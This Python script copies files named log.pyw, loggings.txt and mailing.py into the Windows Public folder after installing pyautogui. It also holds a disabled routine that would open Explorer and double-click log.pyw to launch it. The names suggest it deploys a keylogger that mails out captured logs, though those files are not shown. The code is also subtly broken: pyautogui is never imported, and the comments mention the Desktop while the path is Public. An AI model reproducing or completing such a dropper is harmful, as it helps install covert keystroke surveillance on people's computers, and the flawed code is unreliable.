import os
import subprocess
import time

try:
    subprocess.run(["pip", "install", "pyautogui"])
except:
    print("already installed")

def copy_files_to_desktop():
    # List of files to copy
    files_to_copy = ['log.pyw', 'loggings.txt', 'mailing.py']
    
    for file_name in files_to_copy:
        try:
            # Read file content
            with open(file_name, 'r') as file:
                file_content = file.read()
            
            # Save file to Desktop
            with open(fr'C:\Users\Public\{file_name}', 'w') as file:
                file.write(file_content)
            
            # print("")
        except Exception as e:
            print(f"Error copying {file_name}: {e}")

def execute_log_py():
    try:
        pyautogui.hotkey('win', 'e')

        # Wait for File Explorer to open
        time.sleep(1)

        # Navigate to Desktop
        pyautogui.typewrite('Desktop')

        # Wait for Desktop to be selected
        time.sleep(1)

        # Press Enter to open Desktop
        pyautogui.press('enter')

        # Wait for Desktop window to open
        time.sleep(1)

        # Double-click on log.pyw to open it
        pyautogui.doubleClick('log.pyw')


    except Exception as e:
        print(f"Error executing log.py: {e}")

def main():
    copy_files_to_desktop()
    # execute_log_py()

if __name__ == "__main__":
    main()
